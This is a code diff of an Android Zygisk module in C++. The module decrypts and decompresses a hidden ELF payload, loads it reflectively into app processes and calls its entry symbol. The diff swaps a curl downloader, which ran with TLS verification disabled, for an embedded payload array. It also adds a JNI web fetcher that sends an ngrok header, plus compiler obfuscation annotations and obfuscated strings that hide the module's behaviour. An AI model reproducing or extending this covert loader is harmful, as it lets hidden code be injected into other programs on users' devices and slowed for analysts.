@@ -2,10 +2,9 @@
 #include <jni.h>
 #include <pthread.h>
 #include <thread>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <curl/curl.h>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
 #include <dlfcn.h>
 #include <elf.h>
 #include <link.h>
@@ -13,6 +12,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <fstream>
+#include <sstream>
 #include <sys/prctl.h>
 #include <dirent.h>
 #include <vector>
@@ -23,7 +23,6 @@
 #include <string>
 #include <cstdlib>
 #include <ctime>
-#include <openssl/aes.h>
 #include "oxorany_include.h"
 #include "obfuscate.h"
 #define _(hbj) OBFUSCATE(hbj)
@@ -31,6 +30,7 @@
 #include "URL.h"
 #include "base64.h"
 #include "zygisk.hpp"
+#include "data.h"
 
 // Define LDEBUG Only for Debugging!
 //#define LDEBUG
@@ -52,7 +52,6 @@
 #include <fstream>
 #include <vector>
 #include <cstring>
-#include <openssl/aes.h>
 #include <elf.h>
 
 using zygisk::Api;
@@ -88,57 +87,7 @@ bool checkc() {
     return atoi(OBFUSCATE("0"));
 }
 
-static size_t writebytes(void *data, size_t size, size_t nmemb, void *userp) {
-    size_t realsize = size * nmemb;
-    std::string *str = static_cast<std::string*>(userp);
-    str->append(static_cast<char*>(data), realsize);
-    return realsize;
-}
-
-std::string get_url(const char* site) {
-    CURL *curl = curl_easy_init();
-    std::string datastr;
-    if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, site);
-        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-        curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, std::string(OBFUSCATE("https")).c_str());
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &writebytes);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &datastr);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-        CURLcode res = curl_easy_perform(curl);
-		char *url = NULL;
-        curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);
-        if (!equals(url, site)) return std::string(OBFUSCATE("0"));
-        curl_easy_cleanup(curl);
-    }
-    return datastr;
-}
-
-size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
-    std::vector<char> *data = static_cast<std::vector<char>*>(userp);
-    size_t total_size = size * nmemb;
-    data->insert(data->end(), static_cast<char*>(contents), static_cast<char*>(contents) + total_size);
-    return total_size;
-}
-
-bool get_file(const char *site, std::vector<char> &elf_data) {
-    CURL *curl = curl_easy_init();
-    if (!curl) return false;
-    curl_easy_setopt(curl, CURLOPT_URL, site);
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &elf_data);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    CURLcode res = curl_easy_perform(curl);
-    char *url = NULL;
-    curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);
-    if (!equals(url, site)) return false;
-    curl_easy_cleanup(curl);
-    return (res == CURLE_OK);
-}
-
+__attribute((__annotate__(("nosub"))));
 bool decompress_lzma(const std::vector<char>& input_data, std::vector<char>& output_data) {
     LOGI("Starting LZMA decompression...");
     lzma_stream strm = LZMA_STREAM_INIT;
@@ -207,6 +156,79 @@ void xor_cipher(std::vector<char>& data, const std::string& key, bool mode) {
     }
 }
 
+__attribute((__annotate__(("sub"))));
+__attribute((__annotate__(("bcf"))));
+__attribute((__annotate__(("split"))));
+__attribute((__annotate__(("fla"))));
+
+std::vector<char> JNIURL(JNIEnv *env, jstring urlString) {
+    const char* url = env->GetStringUTFChars(urlString, nullptr);
+    jclass urlClass = env->FindClass(_("java/net/URL"));
+    jclass httpURLConnectionClass = env->FindClass(_("java/net/HttpURLConnection"));
+    if (urlClass == nullptr || httpURLConnectionClass == nullptr) {
+        return {};
+    }
+    jmethodID urlConstructor = env->GetMethodID(urlClass, _("<init>"), _("(Ljava/lang/String;)V"));
+    jobject urlObj = env->NewObject(urlClass, urlConstructor, urlString);
+    jmethodID openConnectionMethod = env->GetMethodID(urlClass, _("openConnection"), _("()Ljava/net/URLConnection;"));
+    jobject connectionObj = env->CallObjectMethod(urlObj, openConnectionMethod);
+    if (connectionObj == nullptr) return {};
+    jobject httpURLConnectionObj = env->NewGlobalRef(connectionObj);
+    jmethodID setRequestMethodMethod = env->GetMethodID(httpURLConnectionClass, _("setRequestMethod"), _("(Ljava/lang/String;)V"));
+    jstring getMethod = env->NewStringUTF(_("GET"));
+    env->CallVoidMethod(httpURLConnectionObj, setRequestMethodMethod, getMethod);
+    jmethodID setRequestPropertyMethod = env->GetMethodID(httpURLConnectionClass, _("setRequestProperty"), _("(Ljava/lang/String;Ljava/lang/String;)V"));
+    jstring ngrokSkip = env->NewStringUTF(_("Ngrok-Skip-Browser-Warning"));
+    jstring trueStr = env->NewStringUTF(_("true"));
+    env->CallVoidMethod(httpURLConnectionObj, setRequestPropertyMethod, ngrokSkip, trueStr);
+    env->DeleteLocalRef(ngrokSkip);
+    env->DeleteLocalRef(trueStr);
+    jmethodID connectMethod = env->GetMethodID(httpURLConnectionClass, _("connect"), _("()V"));
+    env->CallVoidMethod(httpURLConnectionObj, connectMethod);
+    jmethodID getInputStreamMethod = env->GetMethodID(httpURLConnectionClass, _("getInputStream"), _("()Ljava/io/InputStream;"));
+    jobject inputStreamObj = env->CallObjectMethod(httpURLConnectionObj, getInputStreamMethod);
+    if (inputStreamObj == nullptr) return {};
+    jclass inputStreamClass = env->GetObjectClass(inputStreamObj);
+    jmethodID readMethod = env->GetMethodID(inputStreamClass, _("read"), _("([B)I"));
+    std::vector<char> responseStream;
+    jbyteArray byteArray = env->NewByteArray(4096);
+    jint bytesRead = 0;
+    while ((bytesRead = env->CallIntMethod(inputStreamObj, readMethod, byteArray)) != -1) {
+        if (bytesRead > 0) {
+            jbyte* byteData = env->GetByteArrayElements(byteArray, nullptr);
+            responseStream.insert(responseStream.end(), byteData, byteData + bytesRead);
+            env->ReleaseByteArrayElements(byteArray, byteData, JNI_ABORT);
+        }
+    }
+    env->ReleaseStringUTFChars(urlString, url);
+    return responseStream;
+}
+
+JavaVM* jvm;
+
+__attribute((__annotate__(("sub"))));
+__attribute((__annotate__(("bcf"))));
+__attribute((__annotate__(("split"))));
+__attribute((__annotate__(("fla"))));
+
+std::vector<char> get_url(std::string url) {
+    std::vector<char> ret;
+    std::thread t([&]() {
+        JNIEnv* thread_env;
+        bool attached = false;
+        if (jvm->AttachCurrentThread(&thread_env, nullptr) == JNI_OK) {
+            attached = true;
+            ret = JNIURL(thread_env, thread_env->NewStringUTF(url.c_str()));
+        }
+        if (attached) {
+            jvm->DetachCurrentThread();
+        }
+    });
+    t.join();
+    return ret;
+}
+
+__attribute((__annotate__(("nosub"))));
 size_t get_random_mem_size(size_t base_size) {
     size_t page_size = sysconf(_SC_PAGESIZE);
     size_t random_increment = 0;
@@ -235,6 +257,7 @@ typedef struct {
     size_t fini_array_size = 0;
 } ELFObject;
 
+__attribute((__annotate__(("nosub"))));
 size_t get_symbol_count(const void* elf_base) {
     const Elf64_Ehdr* ehdr = reinterpret_cast<const Elf64_Ehdr*>(elf_base);
     const Elf64_Shdr* shdr = reinterpret_cast<const Elf64_Shdr*>(
@@ -248,6 +271,7 @@ size_t get_symbol_count(const void* elf_base) {
     return symbol_count;
 }
 
+__attribute((__annotate__(("nosub"))));
 void *find_symbol(void *base, const char *symbol) {
     if (!symtab || !strtab) {
         LOGE("SYMTAB or STRTAB not found");
@@ -267,6 +291,7 @@ void *find_symbol(void *base, const char *symbol) {
     return NULL;
 }
 
+__attribute((__annotate__(("nosub"))));
 void *resolve_symbol(const char *name, ELFObject obj) {
     void *handle = dlopen(NULL, RTLD_LAZY | RTLD_GLOBAL);
     if (!handle) {
@@ -279,7 +304,11 @@ void *resolve_symbol(const char *name, ELFObject obj) {
     return symbol;
 }
 
+__attribute((__annotate__(("nosub"))));
 ELFObject load_elf(void *elf_mem, size_t size) {
+#ifdef p_type
+#undef p_type
+#endif
     ELFObject obj = {0};
     obj.ehdr = (Elf64_Ehdr *)elf_mem;
     if (memcmp(obj.ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
@@ -480,6 +509,7 @@ ELFObject load_elf(void *elf_mem, size_t size) {
     return obj;
 }
 
+__attribute((__annotate__(("nosub"))));
 void unload_elf(ELFObject obj) {
     LOGI("Unloading ELF");
     if (obj.fini_array && obj.fini_array_size > 0) {
@@ -509,6 +539,7 @@ public:
     void onLoad(Api *api, JNIEnv *env) override {
         env_ = env;
 		api_ = api;
+        env->GetJavaVM(&jvm);
     }
     void preAppSpecialize(AppSpecializeArgs *args) override {
 		std::string process_name;
@@ -521,21 +552,18 @@ public:
     }
     void postAppSpecialize(const AppSpecializeArgs *) override {
         if (proc_stat) {
-            std::vector<char> elf_data;
-            if (!get_file(durl, elf_data) || checkc()) {
-                LOGE("Failed to fetch ELF.");
-                return;
-            }
+            bool hdata = checkc();
+            std::vector<char> elf_data(chdata, chdata + sizeof(chdata));
             xor_cipher(elf_data, OBFUSCATE("System.Reflection"), false);
             std::vector<char> new_elf_data;
-            if (!decompress_lzma(elf_data, new_elf_data) || checkc()) {
-                LOGE("Failed to decompress.");
+            if (!decompress_lzma(elf_data, new_elf_data) || hdata) {
+                LOGT(OBFUSCATE("Failed to decompress. %zu"), elf_data.size());
                 return;
             }
             LOGE("Got ELF bytes, size: %zu", new_elf_data.size());
             ELFObject elf_base = load_elf(new_elf_data.data(), new_elf_data.size());
-            if (!elf_base.base || checkc()) {
-                LOGE("Failed to load ELF data.");
+            if (!elf_base.base || hdata) {
+                LOGT(OBFUSCATE("Failed to load ELF data."));
                 return;
             }
             elf_data.clear();
@@ -545,9 +573,11 @@ public:
             LOGD("ELF successfully loaded at %p", elf_base.base);
             void* awakenptr = resolve_symbol(OBFUSCATE("_Z6awakenv"), elf_base);
             LOGI("Calling _Z6awakenv: %p", awakenptr);
-            if (!checkc() && awakenptr) {
+            if (!hdata && awakenptr) {
                 ((void(*)(void))awakenptr)();
                 LOGI("Successfully called _Z6awakenv: %p", awakenptr);
+            } else {
+                LOGT(OBFUSCATE("_Z6awakenv failed: %p"), awakenptr);
             }
             api_->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);
         }
